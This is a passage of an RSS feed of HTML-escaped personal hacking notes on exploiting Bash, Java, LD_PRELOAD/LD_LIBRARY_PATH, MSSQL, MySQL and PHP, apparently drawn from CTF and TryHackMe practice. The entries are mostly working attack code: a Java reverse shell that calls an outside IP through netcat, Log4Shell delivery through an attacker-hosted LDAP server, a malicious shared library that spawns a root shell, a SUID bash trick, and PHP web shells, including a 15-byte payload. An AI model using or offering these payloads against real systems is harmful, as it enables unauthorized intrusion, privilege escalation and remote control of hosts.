class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;env&lt;/span&gt; -i &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;SHELLOPTS=&lt;/span&gt;xtrace &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;PS4=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;/path/to/suid/executable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Again, this only works &lt;em&gt;if&lt;/em&gt; the calling application is relying on the current shell for helper execution.&lt;/p&gt;&lt;h2 id=&quot;avoid-dropping-privileges-with-suid-bash&quot;&gt;Avoid Dropping Privileges with SUID Bash&lt;/h2&gt;&lt;p&gt;Bash will drop privileges by default if SUID. To avoid this, simply supply the &lt;code&gt;-p&lt;/code&gt; flag. (Not sure how useful this is beyond CTFsâ¦)&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Bash.md</guid>
		</item>
		<item>
			<title>Exploiting Java</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Java.md</link>
			<description>&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;&lt;p&gt;A simple Java exploit that pops a reverse shell (at least on Linux systems with a version of netcat that supports the &lt;code&gt;-e&lt;/code&gt; switch) is:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode java&quot;&gt;&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; Exploit {&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; {&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            java.&lt;span class=&quot;fu&quot;&gt;lang&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Runtime&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getRuntime&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;exec&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;nc -e /bin/bash 1.2.3.4 9999&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (&lt;span class=&quot;bu&quot;&gt;Exception&lt;/span&gt; e) {&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        }&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    }&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Where 1.2.3.4 is the IP you're catching the reverse shell at and 999 is the port of the listener. This can be compiled with:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;javac&lt;/span&gt; Exploit.java -source 8 -target 8&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that the &lt;code&gt;-source&lt;/code&gt; and &lt;code&gt;-target&lt;/code&gt; flags may need to be modified depending on which version of Java the target is running. As with all things Java, the file name and file class name need to match.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netcat%22.md&quot;&gt;Using &quot;netcat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;delivery-with-log4shell&quot;&gt;Delivery with Log4Shell&lt;/h2&gt;&lt;p&gt;Delivery through a vulnerable version of Log4j is done through a four step process: Malicious string â LDAP lookup â load Java code over HTTP â reverse shell.&lt;/p&gt;&lt;p&gt;A simple Java LDAP server that will handle redirects is available at &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;https://github.com/mbechler/marshalsec&lt;/a&gt;. It can be built with Apache Maven using the version of OpenJDK supplied with Kali Linux:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mvn&lt;/span&gt; clean package -DskipTests&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And run with:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;java&lt;/span&gt; -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;marshalsec.jndi.LDAPRefServer&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;st&quot;&gt;&amp;quot;http://&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/#Exploit&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Where &lt;code&gt;$ATTACKER_IP&lt;/code&gt; and &lt;code&gt;$ATTACKER_PORT&lt;/code&gt; are the IP address and port of an HTTP server that will be used to actually serve up the exploit.&lt;/p&gt;&lt;p&gt;Once that's done you'll just need to fire up a quick web server to serve the exploit code above and a netcat listener and then find a way to deliver the malicious string (&lt;code&gt;${jndi:ldap://1.2.3.4:1389/Exploit}&lt;/code&gt;, where 1.2.3.4 is the &lt;code&gt;$ATTACKER_IP&lt;/code&gt; above) somewhere it will be logged.&lt;/p&gt;&lt;p&gt;Note that a number of other protocols are supported besides LDAP (the marchalsec server supports a few).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/solar&quot;&gt;TryHackMe: Solar, Exploiting Log4j&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Quick-n-Dirty%20Python%20Web%20Server.md&quot;&gt;Quick-n-Dirty Python Web Server&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Java.md</guid>
		</item>
		<item>
			<title>Exploiting `LD_LIBRARY_PATH`</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20LD_LIBRARY_PATH.md</link>
			<description>&lt;p&gt;If &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt; is preserved by sudo, then it's possible to use a malicious dynamic library to gain root access. Preserved environment variables are listed by &lt;code&gt;sudo -l&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Use ldd to see what libraries a program is already pulling in, and then name your malicious library after one of these. Then run &lt;code&gt;sudo LD_LIBRARY_PATH=/path/to/malicious/library program-runnable-with-nopasswd&lt;/code&gt; to trick the program into loading your malicious library instead of the legitimate system library.&lt;/p&gt;&lt;p&gt;While the same code as &lt;code&gt;LD_PRELOAD&lt;/code&gt; can be used as a starting point for an &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt; exploit, things get trickier because some libraries are required by others, loaded at different times, or have functions (symbols) that are loaded but not used right away. So some amount of trial-and-error, both in the naming of the malicious library and in what functions are defined within it, may be required.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Not every UNIX-like system calls their library path &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt;!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html&quot;&gt;The Linux Documentation Project: Shared Libraries&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Enumerate%20%22sudo%22%20Access.md&quot;&gt;Enumerate &quot;sudo&quot; Access&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20LD_PRELOAD.md&quot;&gt;Exploiting LD_PRELOAD&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20LD_LIBRARY_PATH.md</guid>
		</item>
		<item>
			<title>Exploiting `LD_PRELOAD`</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20LD_PRELOAD.md</link>
			<description>&lt;p&gt;If &lt;code&gt;LD_PRELOAD&lt;/code&gt; is preserved by sudo, then it's possible to use a malicious dynamic library to gain root access - just run &lt;code&gt;sudo LD_PRELOAD=/path/to/malicious.so program-runnable-with-nopasswd&lt;/code&gt;. Preserved environment variables are listed by &lt;code&gt;sudo -l&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;A simple malicious library (perhaps &lt;em&gt;the&lt;/em&gt; simplest) that can exploit the &lt;code&gt;LD_PRELOAD&lt;/code&gt; trick is:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; _init() {&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    unsetenv(&lt;span class=&quot;st&quot;&gt;&amp;quot;LD_PRELOAD&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    setresuid(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    system(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -p&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compile with:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;gcc&lt;/span&gt; -fPIC -shared -nostartfiles &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-o&lt;/span&gt; /path/to/malicious.so /path/to/malicious.c&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Enumerate%20%22sudo%22%20Access.md&quot;&gt;Enumerate &quot;sudo&quot; Access&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20LD_PRELOAD.md</guid>
		</item>
		<item>
			<title>Exploiting MSSQL</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20MSSQL.md</link>
			<description>&lt;h2 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;auxiliary/scanner/mssql/mssql_ping&lt;/code&gt; - Discover MSSQL servers (&lt;em&gt;alternatively, use &lt;code&gt;--script=ms-sql-info&lt;/code&gt; with nmap&lt;/em&gt;).&lt;/li&gt;&lt;li&gt;&lt;code&gt;auxiliary/scanner/mssql/mssql_login&lt;/code&gt; - Brute force logins.&lt;/li&gt;&lt;li&gt;&lt;code&gt;auxiliary/admin/mssql/mssql_enum&lt;/code&gt; - Enumerate databases.&lt;/li&gt;&lt;li&gt;&lt;code&gt;exploit/windows/mssql/mssql_payload&lt;/code&gt; - Get a shell.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20MSSQL.md</guid>
		</item>
		<item>
			<title>Exploiting MySQL</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20MySQL.md</link>
			<description>&lt;p&gt;You can &quot;upload&quot; reverse shells using MySQL using &lt;code&gt;INTO OUTFILE&lt;/code&gt;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode sql&quot;&gt;&lt;code class=&quot;sourceCode sql&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]); ?&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;INTO&lt;/span&gt; OUTFILE &lt;span class=&quot;st&quot;&gt;&amp;#39;/var/www/html/cmd.php&amp;#39;&lt;/span&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The path may require some brute-forcing or additional reconnaissance; sometimes you can force an error to return a (potentially) writeable path. Depending on how the application you're attacking is configured, it may be possible to exploit this via SQLi.&lt;/p&gt;&lt;p&gt;This can be used to bootstrap reverse shells.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./SQL%20Injection.md&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20MySQL.md</guid>
		</item>
		<item>
			<title>Exploiting PHP</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20PHP.md</link>
			<description>&lt;h2 id=&quot;rce-via-xxe&quot;&gt;RCE via XXE&lt;/h2&gt;&lt;p&gt;RCE through XEE is apparently rare, but can be achieved via the PHP expect module.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode xml&quot;&gt;&lt;code class=&quot;sourceCode xml&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;?xml&lt;/span&gt; version=&amp;quot;1.0&amp;quot;&lt;span class=&quot;kw&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;&amp;lt;!DOCTYPE &lt;/span&gt;root &lt;span class=&quot;dt&quot;&gt;[&amp;lt;!ENTITY&lt;/span&gt; xxerce SYSTEM &lt;span class=&quot;st&quot;&gt;&amp;quot;expect://id&amp;quot;&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;&amp;gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;&amp;amp;xxerce;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection&quot;&gt;Exploitation: XML External Entity (XXE) Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./XXE%20%28XML%20External%20Entity%29%20Attacks.md&quot;&gt;XXE (XML External Entity) Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;the-poison-null-byte&quot;&gt;The Poison Null Byte&lt;/h2&gt;&lt;p&gt;PHP string parsing is susceptible to the poison null byte.&lt;/p&gt;&lt;p&gt;The best way to defend against these attacks is to simply sanitize strings by explicitly removing any null bytes they contain.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode php&quot;&gt;&lt;code class=&quot;sourceCode php&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;$sanitized_string&lt;/span&gt; = &lt;span class=&quot;fu&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;$original_string&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;);&lt;/span&gt;  &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://defendtheweb.net/article/common-php-attacks-poison-null-byte&quot;&gt;Common PHP attacks: Poison Null Byte&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./The%20Poison%20Null%20Byte.md&quot;&gt;The Poison Null Byte&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;web-based-rce&quot;&gt;Web-Based RCE&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode php&quot;&gt;&lt;code class=&quot;sourceCode php&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt; . &lt;span class=&quot;fu&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;])&lt;/span&gt; . &lt;span class=&quot;st&quot;&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A slightly spruced-up version of this is available on Kali Linux as &lt;code&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;On space-constrained systems, you can compact this down to just 15 bytes:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode php&quot;&gt;&lt;code class=&quot;sourceCode php&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;$_GET[1]&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;relevant-twitter-thread&quot;&gt;Relevant Twitter Thread&lt;/h3&gt;&lt;blockquote&gt;&lt;p&gt;Did you know the shortest payload to achieve code execution in PHP is only 15 bytes long ? ð¤¯ If you can inject it in a page on the site you will achieve remote code execution! This is really useful in BugBounty or pentest when you have a limited input size.&lt;/p&gt;&lt;p&gt;â &lt;a href=&quot;https://twitter.com/podalirius_/status/1488921781637365771&quot;&gt;Podalirius (Twitter)&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote&gt;&lt;p&gt;To trigger the code execution, you have to find a way to access your injected page (direct access or inclusion) and add this GET parameter to the URL: &lt;a href=&quot;http://localhost:8000/rce.php?1=id&quot;&gt;http://localhost:8000/rce.php?1=id&lt;/a&gt;&lt;/p&gt;&lt;p&gt;â &lt;a href=&quot;https://twitter.com/podalirius_/status/1488921786515435520&quot;&gt;Podalirius (Twitter)&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote&gt;&lt;p&gt;This payload can be used to be reflected in many files on a web application, for example you can put it: (1) In metadata, (2) somewhere in the logs, (3) in an uploaded file that you control, (4) in your PHP session (it will be written to a file)&lt;/p&gt;&lt;p&gt;â &lt;a href=&quot;https://twitter.com/podalirius_/status/1488921788742569987&quot;&gt;Podalirius (Twitter)&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;h2 